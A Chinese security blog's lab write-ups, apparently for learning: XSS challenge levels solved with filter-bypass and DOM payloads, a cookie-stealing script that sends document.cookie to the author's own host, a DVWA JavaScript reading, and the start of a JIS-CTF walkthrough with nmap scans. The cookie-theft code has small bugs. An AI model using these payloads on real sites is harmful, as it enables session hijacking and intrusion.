<p><img src="/assets/image-20180531230254166.png" alt="image-20180531230254166"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example5.php?name=script</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20180531225902413.png" alt="image-20180531225902413"></p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example5.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span></span><br></pre></td></tr></table></figure>

<p>先前猜是基于标签过滤的，后来发现并不是，只是正好前面测试的两个都含有alert关键词而已。根据后面几种结果猜想可能是基于alert关键词报错。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example5.php?name=alert</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20180531230641775.png" alt="image-20180531230641775"></p>
<p>猜想正确，所以只需换个关键词应该就可以了。</p>
<p>换为confirm试试</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example5.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">confirm(<span class="string">"flag"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20180531230929514.png" alt="image-20180531230929514"></p>
<p>成功弹出。</p>
<p>再试试用编码是否可以绕过alert关键词检测</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example<span class="number">5</span>.php?name=&lt;script&gt;<span class="symbol">%61</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%65</span><span class="symbol">%72</span><span class="symbol">%74</span>(<span class="string">"flag"</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20180531231029514.png" alt="image-20180531231029514"></p>
<p>报错，证明URL编码不能绕过。</p>
<p>换下其他的</p>
<p>用echo+String.fromCharCode()</p>
<p>echo()函数可以计算某个字符串并执行其中的代码</p>
<p>String.fromCharCode()可接收一个指定的Unicode值，然后返回一个字符串</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example5.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">116</span>)+<span class="string">"('flag')"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>没报错，但是不弹框，为什么呢？看下源代码</p>
<p><img src="/assets/image-20180601000225847.png" alt="image-20180601000225847"></p>
<p>+号怎么变成了空格呢？</p>
<p>用URL编码试试</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example5.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">116</span>)%<span class="number">2</span>b<span class="string">"('flag')"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>成功弹框</p>
<h4><span id="17-第六关">1.7、第六关</span></h4><p><img src="/assets/image-20180601143017232.png" alt="image-20180601143017232"></p>
<p>这次屏幕连hacker都不显示了。</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">200.106</span>/xss/example6.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>不报错也不弹框,显示</p>
<p><img src="/assets/image-20180601142057853.png" alt="image-20180601142057853"></p>
<p>为什么显示”;呢？很奇怪。试探下是什么原因造成”;的</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.200.106/xss</span><span class="regexp">/example6.php?name=&lt;script&gt; #没有</span></span><br><span class="line"><span class="regexp">http:/</span><span class="regexp">/192.168.200.106/xss</span><span class="regexp">/example6.php?name=&lt;script&gt;&lt;/script</span>&gt; <span class="comment">#有";</span></span><br><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.200.106/xss</span><span class="regexp">/example6.php?name=&lt;/script</span>&gt;  <span class="comment">#有";</span></span><br><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.200.106/xss</span><span class="regexp">/example6.php?name=&lt;a&gt;&lt;/a</span>&gt;    <span class="comment">#没有</span></span><br></pre></td></tr></table></figure>

<p>看来只要有script就有”;</p>
<p>再在</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">200.106</span>/xss/example6.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p> 下开下源代码</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">Hello </span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">	var $a= "</span><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="xml">";</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>发现本来就有script标签了的，这也是为什么先前屏幕不显示的原因</p>
<p>仔细看看发现只有输入的把前面的”号闭合了就可以执行自己想要的js代码了</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">200.106</span><span class="regexp">/xss/</span>example6.php?name=<span class="number">1</span><span class="string">";alert('flag');</span></span><br></pre></td></tr></table></figure>

<p>仍然不弹出，再看看源码</p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">Hello </span><br><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="built_in">var</span> $a= <span class="string">"1"</span>;alert(<span class="string">'flag'</span>);<span class="string">";</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现忘记闭合后面的引号了使用注释试试（注意js的注释是//而不是#）</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">200.106</span><span class="regexp">/xss/</span>example6.php?name=<span class="number">1</span><span class="string">";alert('flag');//</span></span><br></pre></td></tr></table></figure>

<p>成功弹出框</p>
<h4><span id="18-第七关">1.8、第七关</span></h4><p>这次学到上关的经验了，直接看源代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Hello </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> $a= <span class="string">'hacker'</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果没有过滤输入的话相信只要把前面的引号闭合和后面的引号注释就行了。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">200.106</span><span class="regexp">/xss/</span>example7.php?name=<span class="number">1</span><span class="string">';alert('</span>flag<span class="string">');//</span></span><br></pre></td></tr></table></figure>

<p>直接弹框</p>
<h4><span id="19-第八关">1.9、第八关</span></h4><p><img src="/assets/image-20180601144627983.png" alt="image-20180601144627983"></p>
<p>这次换了做法，改为提交参数了。</p>
<p>先试一下</p>
<p>输入1</p>
<p><img src="/assets/image-20180601144656941.png" alt="image-20180601144656941"></p>
<p>输入<code>&lt;script&gt;alert(&#39;flag&#39;)&lt;/script&gt;</code></p>
<p><img src="/assets/image-20180601144748978.png" alt="image-20180601144748978"></p>
<p>看来数据没有被当为代码执行</p>
<p>使用单引号双引号都没用，到底为什么呢？</p>
<p>看看源代码：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">&lt;form action="/xss/example8.php" <span class="keyword">method</span>="POST"&gt;</span><br><span class="line">  Your <span class="type">name</span>:&lt;<span class="keyword">input</span> <span class="keyword">type</span>="text" <span class="type">name</span>="name" /&gt;</span><br><span class="line">  &lt;<span class="keyword">input</span> <span class="keyword">type</span>="submit" <span class="type">name</span>="submit"/&gt;</span><br></pre></td></tr></table></figure>

<p>很惊奇的发现action的目标居然是本身。</p>
<p>忽然之间想到学php的时候w3cschool上面讲到action最好别用自身，</p>
<p>参见：<a href="http://www.w3school.com.cn/php/php_form_validation.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/php_form_validation.asp</a></p>
<p>如果把action的引号闭合掉，弄为</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">&lt;form <span class="built_in">action</span>=<span class="string">"/xss/example8.php"</span>&gt;&lt;script&gt;alert(<span class="string">'flag'</span>)&lt;/script&gt;<span class="comment">// "method="POST"&gt; </span></span><br><span class="line">Your <span class="built_in">name</span>:&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> <span class="built_in">name</span>=<span class="string">"name"</span> /&gt; </span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> <span class="built_in">name</span>=<span class="string">"submit"</span>/&gt;</span><br></pre></td></tr></table></figure>

<p>是不是就能弹框了？试一下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">http://192.168.200.106/xss/example8.php/"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20180601145817629.png" alt="image-20180601145817629"></p>
<p>成功弹框。</p>
<h4><span id="110-第九关">1.10、第九关</span></h4><p>URL：<a href="http://192.168.200.106/xss/example9.php#hacker" target="_blank" rel="noopener">http://192.168.200.106/xss/example9.php#hacker</a></p>
<p>源码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.write(location.hash.substring(<span class="number">1</span>));</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>显示：<img src="/assets/image-20180601150140807.png" alt="image-20180601150140807"></p>
<p>注意到由location.hash，看下这个属性的定义</p>
<p>hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。</p>
<p>看来是将#后面的字符显示在屏幕上，而且里面已经有script标签了。</p>
<p>尝试闭合一下write里的)试试</p>
<p>DOM型XSS，#后面输入payload即可：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">http://192.168.200.106/xss/example9.php#<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(‘flag‘)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="2-js实战">2、JS实战</span></h3><p>在第一部分我们已经攻下了靶机的XSS关，那么XSS有什么用呢？仅仅是弹框吗？我们用所学的JS来获取一些有用信息。</p>
<p>为了方便，所以就拿刚刚靶场的第一关来做测试</p>
<p>(1)盗取cookie</p>
<p>首先在自己的主机上/3/html文件下搭建一个js文件evil.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">"a"</span>); <span class="comment">//创建一个对象</span></span><br><span class="line">a.src=<span class="string">"http://192.168.43.244/3/html/log?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie); <span class="comment">//对象的源地址</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);<span class="comment">//把对象加入为网页的body的子控件</span></span><br></pre></td></tr></table></figure>

<p>因为靶机网页里没有cookie所以用google的EditThisCookie给靶机加了个cookie:</p>
<p>user:hacer</p>
<p>现在只需要在靶机网页上访问我的evil.js就能在我的web服务器日志中看到请求。可用如下方式访问</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.43.244/3/html/evil.js"</span>&gt;</span> <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>网页中为：</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">43.146</span>/xss/example1.php<span class="built_in">?name</span>=<span class="meta">%3Cscript</span><span class="meta">%20src</span>=<span class="meta">%22http:</span>//<span class="number">192.168</span>.<span class="number">43.244</span>/<span class="number">3</span>/html/evil.js<span class="meta">%22</span><span class="meta">%3E</span><span class="meta">%3C</span>/script<span class="meta">%3E</span></span><br></pre></td></tr></table></figure>

<p>然后在自己的apache服务器下的/var/log/apache2找到日志</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.43.244</span> - - <span class="string">[02/Jun/2018:19:40:17 +0800]</span> <span class="string">"<span class="keyword">GET</span> /3/html/log?user%3Dhacer HTTP/1.1"</span> <span class="number">404</span> <span class="number">208</span></span><br></pre></td></tr></table></figure>

<p>可以看到cookie已经成功显示：</p>
<p>user%3dhacer</p>
<p>即user:hacer</p>
<p>(2)基本语法测试</p>
<p>改一下evil.js。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">'host:'</span>+location.hostname+<span class="string">"&lt;/br&gt;"</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'path:'</span>+location.pathname+<span class="string">"&lt;/br&gt;"</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'port:'</span>+location.port+<span class="string">"&lt;/br&gt;"</span>);</span><br></pre></td></tr></table></figure>

<p>访问,屏幕显示：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">Hello  <span class="string">host:</span><span class="number">192.168</span><span class="number">.43</span><span class="number">.146</span> </span><br><span class="line"><span class="string">path:</span><span class="regexp">/xss/</span>example1.php</span><br><span class="line"><span class="string">port:</span></span><br></pre></td></tr></table></figure>

<p>再改一下evil.js</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">window</span>.<span class="keyword">open</span>("http://www.baidu.com");</span><br><span class="line"><span class="keyword">window</span>.closed="true";</span><br></pre></td></tr></table></figure>

<p>这样就会打开另外一个网页并关闭原来的网页。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">downloadFile(<span class="string">"https://pentesterlab.com/exercises/linux_host_review/iso"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">downloadFile</span>(<span class="params">url</span>) </span>&#123;   </span><br><span class="line">   <span class="keyword">try</span>&#123; </span><br><span class="line">        <span class="keyword">var</span> elemIF = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);   </span><br><span class="line">        elemIF.src = url;   </span><br><span class="line">        elemIF.style.display = <span class="string">"none"</span>;   </span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(elemIF);   </span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123; </span><br><span class="line">        zzrw.alert(<span class="string">"下载异常！"</span>);</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就会下载一个文档。</p>
<p>因为XSS也是入门所以更多的练习将会在以后开展。</p>
<h3><span id="3-js代码阅读">3、JS代码阅读</span></h3><p>看一下dvwa的dvwaPage.js代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Help popup */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">popUp</span>(<span class="params">URL</span>) </span>&#123;</span><br><span class="line">	day = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">	id = day.getTime();</span><br><span class="line">	<span class="built_in">eval</span>(<span class="string">"page"</span> + id + <span class="string">" = window.open(URL, '"</span> + id + <span class="string">"', 'toolbar=0,scrollbars=1,location=0,statusbar=0,menubar=0,resizable=1,width=500,height=300,left = 540,top = 250');"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Form validation */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_required</span>(<span class="params">field,alerttxt</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">with</span> (field) &#123;</span><br><span class="line">  <span class="keyword">if</span> (value==<span class="literal">null</span>||value==<span class="string">""</span>) &#123;</span><br><span class="line">    alert(alerttxt);<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_form</span>(<span class="params">thisform</span>) </span>&#123;</span><br><span class="line"><span class="keyword">with</span> (thisform) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Guestbook form</span></span><br><span class="line">  <span class="keyword">if</span> (validate_required(txtName,<span class="string">"Name can not be empty."</span>)==<span class="literal">false</span>)</span><br><span class="line">  &#123;txtName.focus();<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (validate_required(mtxMessage,<span class="string">"Message can not be empty."</span>)==<span class="literal">false</span>)</span><br><span class="line">  &#123;mtxMessage.focus();<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要是三个函数</p>
<p>先看第一个函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">popUp</span>(<span class="params">URL</span>) </span>&#123;</span><br><span class="line">	day = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">	id = day.getTime();</span><br><span class="line">	<span class="built_in">eval</span>(<span class="string">"page"</span> + id + <span class="string">" = window.open(URL, '"</span> + id + <span class="string">"', 'toolbar=0,scrollbars=1,location=0,statusbar=0,menubar=0,resizable=1,width=500,height=300,left = 540,top = 250');"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传入参数是URL,意思传入一个网页</p>
<p>首先根据new Date()获取今天的日期并赋值给一个day变量。</p>
<p>再调用day变量中的getTime()方法获取时间并赋值给id变量。</p>
<p>再调用eval函数执行里面的代码。里面的代码为打开一个新窗口，并制定窗口风格大小等，并把这个窗口的句柄赋值给页面的id。</p>
<p>接着看第二个函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_required</span>(<span class="params">field,alerttxt</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">with</span> (field) &#123;</span><br><span class="line">  <span class="keyword">if</span> (value==<span class="literal">null</span>||value==<span class="string">""</span>) &#123;</span><br><span class="line">    alert(alerttxt);<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数的主要功能是验证输入值是否为空。</p>
<p>函数传入两个参数field和alerttxt，返回值为布尔类型。</p>
<p>然后验证field的value变量是否为空，是的话弹出alertxt的内容返回false。</p>
<p>否则的话返回true.</p>
<p>再看第三个函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_form</span>(<span class="params">thisform</span>) </span>&#123;</span><br><span class="line"><span class="keyword">with</span> (thisform) &#123;</span><br><span class="line">  <span class="comment">// Guestbook form</span></span><br><span class="line">  <span class="keyword">if</span> (validate_required(txtName,<span class="string">"Name can not be empty."</span>)==<span class="literal">false</span>)</span><br><span class="line">  &#123;txtName.focus();<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (validate_required(mtxMessage,<span class="string">"Message can not be empty."</span>)==<span class="literal">false</span>)</span><br><span class="line">  &#123;mtxMessage.focus();<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数的主要功能使验证提交的表单。</p>
<p>输入参数为thisform，返回值为布尔类型。</p>
<p>逻辑是先调用validate_required()函数判断thisform.txtName是否为空，为空则把光标放在txtName输入框，返回false。</p>
<p>不为空再调用validate_required()函数判断thisform.mtxMessage是否为空,为空则把光标放在mtxMessage输入框，返回false。不为空返回true。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>JIS-CTF靶机测试</title>
    <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/JIS-CTF%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<h1><span id="jis-ctf-靶机测试">JIS-CTF 靶机测试</span></h1><p>​                                                                                      </p>
<h2><span id="一-环境搭建">一、环境搭建</span></h2><p>从下面网站下载ova文件并导入到virtual box中。</p>
<p><a href="https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/</a></p>
<a id="more"></a>

<h2><span id="二-找flag">二、找flag</span></h2><h3><span id="1ip探测">（1）ip探测</span></h3><p>首先探测靶机的IP地址</p>
<p>netdiscover -i eth0</p>
<p>发现mac地址08:00:27:68:18:58对应的ip地址为192.168.1.118</p>
<h3><span id="2端口扫描">（2）端口扫描</span></h3><p>扫描下端口、服务和操作系统</p>
<p>nmap -sV -O 192.168.1.118</p>
<p>结果:</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">7.2</span>p2 Ubuntu <span class="number">4</span>ubuntu2<span class="number">.1</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2.4</span><span class="number">.18</span> ((Ubuntu))</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">68</span>:<span class="number">18</span>:<span class="number">58</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux <span class="number">3.</span>X|<span class="number">4.</span>X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">3</span> cpe:/o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS details: Linux <span class="number">3.2</span> - <span class="number">4.8</span></span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS <span class="keyword">and</span> Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br></pre></td></tr></table></figure>

<p>只开了ssh端口和http端口，且是apache服务器，Ubuntu系统</p>
<p>（3）扫描下常见漏洞：</p>
<p>nmap –script=vuln 192.168.1.118</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">Host is up (<span class="number">0.00060</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp open  ssh</span><br><span class="line"><span class="number">80</span>/tcp open  http</span><br><span class="line">| <span class="type">http</span>-csrf:</span><br><span class="line">| <span class="type">Spidering</span> limited to: maxdepth=<span class="number">3</span>; maxpagecount=<span class="number">20</span>; withinhost=<span class="number">192.168</span><span class="number">.1</span><span class="number">.118</span></span><br><span class="line">|   <span class="type">Found</span> the following possible CSRF vulnerabilities:</span><br><span class="line">|<span class="type"></span></span><br><span class="line"><span class="type">|     Path</span>: http://<span class="number">192.168</span><span class="number">.1</span><span class="number">.118</span>:<span class="number">80</span>/</span><br><span class="line">|     <span class="type">Form</span> id:</span><br><span class="line">|<span class="type">_</span>    Form action: check_login.php</span><br><span class="line">|<span class="type">_http</span>-dombased-xss: Couldn't find any DOM based XSS.</span><br><span class="line">| <span class="type">http</span>-enum:</span><br><span class="line">|   <span class="type">/admin_area</span>/: Possible admin folder</span><br><span class="line">|   <span class="type">/login</span>.php: Possible admin folder</span><br><span class="line">|   <span class="type">/admin_area</span>/index.php: Possible admin folder</span><br><span class="line">|   <span class="type">/robots</span>.txt: Robots file</span><br><span class="line">|   <span class="type">/css</span>/: Potentially interesting directory w/ listing on 'apache/<span class="number">2.4</span><span class="number">.18</span> (ubuntu)'</span><br><span class="line">|<span class="type">_</span>  /js/: Potentially interesting directory w/ listing on 'apache/<span class="number">2.4</span><span class="number">.18</span> (ubuntu)'</span><br><span class="line">| <span class="type">http</span>-slowloris-check:</span><br><span class="line">|   <span class="type">VULNERABLE</span>:</span><br><span class="line">|   <span class="type">Slowloris</span> DOS attack</span><br><span class="line">|     <span class="type">State</span>: LIKELY VULNERABLE</span><br><span class="line">|     <span class="type">IDs</span>:  CVE:CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|       <span class="type">Slowloris</span> tries to keep many connections to the target web server open and hold</span><br><span class="line">|       <span class="type">them</span> open <span class="built_in">as</span> long <span class="built_in">as</span> possible.  It accomplishes this <span class="built_in">by</span> opening connections to</span><br><span class="line">|       <span class="type">the</span> target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       <span class="type">the</span> http server's resources causing Denial Of Service.</span><br><span class="line">|<span class="type"></span></span><br><span class="line"><span class="type">|     Disclosure</span> date: <span class="number">2009</span><span class="number">-09</span><span class="number">-17</span></span><br><span class="line">|     <span class="type">References</span>:</span><br><span class="line">|       <span class="type">https</span>://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|<span class="type">_</span>      http://ha.ckers.org/slowloris/</span><br><span class="line">|<span class="type">_http</span>-stored-xss: Couldn't find any stored XSS vulnerabilities.</span><br><span class="line">|<span class="type">_http</span>-vuln-cve2017<span class="number">-1001000</span>: ERROR: <span class="keyword">Script</span> execution failed (use -d to debug)</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">68</span>:<span class="number">18</span>:<span class="number">58</span> (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<h3><span id="4找第一个flag">（4）找第一个flag</span></h3><p>有robots敏感目录</p>
<p>robots.txt文件：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">User-<span class="string">agent:</span> *</span><br><span class="line"><span class="string">Disallow:</span> /</span><br><span class="line"><span class="string">Disallow:</span> /backup</span><br><span class="line"><span class="string">Disallow:</span> /admin</span><br><span class="line"><span class="string">Disallow:</span> /admin_area</span><br><span class="line"><span class="string">Disallow:</span> /r00t</span><br><span class="line"><span class="string">Disallow:</span> /uploads</span><br><span class="line"><span class="string">Disallow:</span> /uploaded_files</span><br><span class="line"><span class="string">Disallow:</span> /flag</span><br></pre></td></tr></table></figure>

<p>flag敏感目录很明显，进入拿到第一个flag</p>
<p>The 1st flag is : {8734509128730458630012095}</p>
<h3><span id="5找第二个flag">（5）找第二个flag</span></h3><p>再查找其他隐藏目录，一个个的翻，终于在</p>
<p>admin_area/index.php下找到。</p>
<p>在第一遍查看时我直接看到这个就跳过了，然后找半天没有办法再一个个仔细看，在这个源代码中发现了第二个flag.</p>
<p>源代码：</p>
